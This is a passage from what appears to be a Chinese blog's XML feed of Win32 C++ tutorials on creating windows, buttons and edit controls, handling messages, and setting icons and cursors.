class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-keyword">static</span> HINSTANCE hInstance = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-comment">//MessageBoxW(hwnd, L&quot;窗口创建了&quot;, L&quot;提示&quot;, MB_OK);</span><br><span class="hljs-comment">//添加控件</span><br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;移动窗口&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x100</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;获取文本框内容&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x101</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置文本框内容&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">110</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x102</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置父窗口&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">160</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x103</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_EDIT, <span class="hljs-string">L&quot;文本框内容&quot;</span>, WS_CHILD | WS_BORDER | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">320</span>, <span class="hljs-number">320</span>, <span class="hljs-number">80</span>, hwnd, (HMENU)<span class="hljs-number">0x104</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置ICON&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">220</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x105</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置鼠标&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">420</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x106</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_COMMAND:<br>&#123;<br>WORD ControlId = <span class="hljs-built_in">LOWORD</span>(wParam);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ControlId)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x100</span>:<br>&#123;<br>RECT rect&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">GetClientRect</span>(hwnd, &amp;rect);<br><span class="hljs-keyword">int</span> x = <span class="hljs-built_in">rand</span>() % (rect.right - <span class="hljs-number">120</span>);<br><span class="hljs-keyword">int</span> y = <span class="hljs-built_in">rand</span>() % (rect.bottom - <span class="hljs-number">40</span>);<br><span class="hljs-built_in">MoveWindow</span>((HWND)lParam, x, y, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, TRUE);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x101</span>:<br>&#123;<br>WCHAR buff[<span class="hljs-number">100</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>HWND hedit = <span class="hljs-built_in">GetDlgItem</span>(hwnd, <span class="hljs-number">0x104</span>);<br><span class="hljs-built_in">GetWindowTextW</span>(hedit, buff, <span class="hljs-number">100</span>);<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, buff, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x102</span>:<br>&#123;<br><span class="hljs-comment">/*HWND hedit = GetDlgItem(hwnd, 0x104);</span><br><span class="hljs-comment">SetWindowTextW(hedit,0x104,L&quot;SetWindowTextW&quot;);*/</span><br><span class="hljs-built_in">SetDlgItemTextW</span>(hwnd, <span class="hljs-number">0x104</span>, <span class="hljs-string">L&quot;SetDlgItemTextW&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x103</span>:<br>&#123;<br>HWND hnote = <span class="hljs-built_in">FindWindowW</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;无标题 - 记事本&quot;</span>);<br><span class="hljs-built_in">SetParent</span>((HWND)lParam, hnote);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x105</span>:<br>&#123;<br><span class="hljs-comment">//LPCWSTR</span><br><span class="hljs-comment">//MAKEINTRESOURCE</span><br><span class="hljs-comment">//LoadIcon(hInstance, (LPCWSTR)IDI_ICON1);</span><br>HICON hicon=<span class="hljs-built_in">LoadIcon</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDI_ICON1));<br><span class="hljs-built_in">SetClassLongW</span>(hwnd,GCL_HICON,(LONG)hicon);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x106</span>:<br>&#123;<br><br>HCURSOR hcursor = <span class="hljs-built_in">LoadCursorW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDC_CURSOR1));<br><span class="hljs-built_in">SetClassLongW</span>(hwnd, GCL_HCURSOR, (LONG)hcursor);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd, uMsg, wParam, lParam);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPreInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR lpCmdeLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCmdShow</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1.创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br>myClass.hbrBackground = <span class="hljs-built_in">CreateSolidBrush</span>(<span class="hljs-built_in">RGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>));<br><span class="hljs-comment">//myClass.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));//设置图标</span><br>myClass.hCursor= <span class="hljs-built_in">LoadCursorW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDC_CURSOR1));<br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br>HWND hwindow = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwindow, SW_SHOWNORMAL);<br><br><span class="hljs-comment">//5.获取消息</span><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-built_in">DispatchMessageW</span>(&amp;msg);<span class="hljs-comment">//分发消息给消息处理函数</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows窗口控件</title>
    <link href="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/"/>
    <url>/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/2.png" alt="2"></p><p><img src="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/3.png" alt="3"></p><p><img src="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/4.png" alt="4"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-keyword">static</span> HINSTANCE hInstance = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-comment">//MessageBoxW(hwnd, L&quot;窗口创建了&quot;, L&quot;提示&quot;, MB_OK);</span><br><span class="hljs-comment">//添加控件</span><br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;按钮1&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">100</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x100</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd, uMsg, wParam, lParam);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPreInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR lpCmdeLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCmdShow</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1.创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br>HWND hwindow = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwindow, SW_SHOWNORMAL);<br><br><span class="hljs-comment">//5.获取消息</span><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-built_in">DispatchMessageW</span>(&amp;msg);<span class="hljs-comment">//分发消息给消息处理函数</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程消息处理</title>
    <link href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/"/>
    <url>/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/1.png" alt="1"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/2.png" alt="2"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/3.png" alt="3"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/4.png" alt="4"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">const</span> UINT WM_USERMSG = WM_USER + <span class="hljs-number">1</span>;   <span class="hljs-comment">//自定义消息事件</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">(LPCWSTR format, ...)</span> </span>&#123;<br>WCHAR wchar_buff[<span class="hljs-number">100</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>va_list arglist;<br><span class="hljs-built_in">va_start</span>(arglist, format);<br><span class="hljs-built_in">wvsprintfW</span>(wchar_buff, format, arglist);<br><span class="hljs-built_in">va_end</span>(arglist);<br><span class="hljs-built_in">OutputDebugStringW</span>(wchar_buff);<br><br>&#125;<br><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口创建了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_MOUSEMOVE:<br><span class="hljs-comment">//print(L&quot;鼠标移动了！/n,%d&quot;,a);</span><br><span class="hljs-comment">//a++;</span><br>&#123;<br>WORD X = <span class="hljs-built_in">LOWORD</span>(lParam);<br>WORD Y = <span class="hljs-built_in">HIWORD</span>(lParam);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">L&quot;鼠标移动了！X坐标%d,Y坐标%d&quot;</span>, X, Y);<br><span class="hljs-keyword">break</span>; <br>&#125;<br><span class="hljs-keyword">case</span> WM_LBUTTONDOWN:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">L&quot;鼠标左键按下了/n&quot;</span>);<br><span class="hljs-built_in">SendMessageW</span>(hwnd, WM_USERMSG, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">case</span> WM_USERMSG:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">L&quot;自定义消息！/n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd, uMsg, wParam, lParam);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HINSTANCE hInstance,      <span class="hljs-comment">// handle to current instance</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ HINSTANCE hPrevInstance,  <span class="hljs-comment">// handle to previous instance</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPSTR lpCmdLine,          <span class="hljs-comment">// command line</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ <span class="hljs-keyword">int</span> nCmdShow              <span class="hljs-comment">// show state</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br>HWND hwnd = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwnd, SW_SHOWNORMAL);<br><span class="hljs-comment">//5.获取消息</span><br><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))&#123;<br><span class="hljs-built_in">DispatchMessage</span>(&amp;msg);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/5.png" alt="5"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/6.png" alt="6"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/7.png" alt="7"></p>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程第一个窗口程序</title>
    <link href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/"/>
    <url>/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/1.png" alt="1"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/2.png" alt="2"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/3.png" alt="3"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tagWNDCLASSW</span> &#123;</span><br>  UINT      style;<br>  WNDPROC   